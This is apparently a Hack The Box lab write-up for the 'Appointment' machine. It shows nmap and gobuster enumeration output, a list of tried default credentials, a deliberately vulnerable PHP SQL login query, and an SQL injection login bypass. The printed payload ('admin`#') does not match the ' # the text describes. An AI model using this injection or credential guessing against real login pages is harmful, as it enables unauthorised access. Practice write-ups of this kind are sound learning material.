# [Appointment](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.164.45

### Enumeration

Here we are scanning the target machine for open ports and services also we added to scan for the default scripts. In result we found that apache server is running on the target which means that this target is hosting a site on the address.

**Command 1** -

`nmap -sC -sV 10.129.164.45`
**Output** -

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 23:40 IST
Nmap scan report for 10.129.164.45
Host is up (0.60s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.48 seconds
```
Now we accessed the site on the http://10.129.164.45/

![Login page image](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Appointment/Photo_1.png)

Now we will use gobuster to find all the possible directories present in the site. The wordlist we used was downloaded through github the repo name is `SecLists`. In conclusion we found 5 directories which are used by the target on the web site.

**Command 2** -

`gobuster dir --url http://10.129.164.45/ --wordlist ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`

**Output** -

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.164.45/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/goobar07/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.164.45/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.164.45/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.164.45/js/]
/vendor               (Status: 301) [Size: 315] [--> http://10.129.164.45/vendor/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.164.45/fonts/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

### Foothold

Now we tried these combination on the login page, but they didn't worked.

```
admin:admin
guest:guest
user:user
root:root
administrator:password
```

Now we will use the sql injection to get the access of the website using the login page. Here is an example how a username and password get checked in the `PHP & SQL` which can be exploited by adding a `' #` which will close the string and also make the end of the query comment. In conclusion we got the access to the flag page using these credentials.

`$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";`

```
username: admin`#
password: abc123
```

![Flag page image](https://github.com/goobar07/HTB-30_Day-Challenge/blob/main/Tier_1/Appointment/Photo_2.png)

### This machine has been pawned

~goobar07
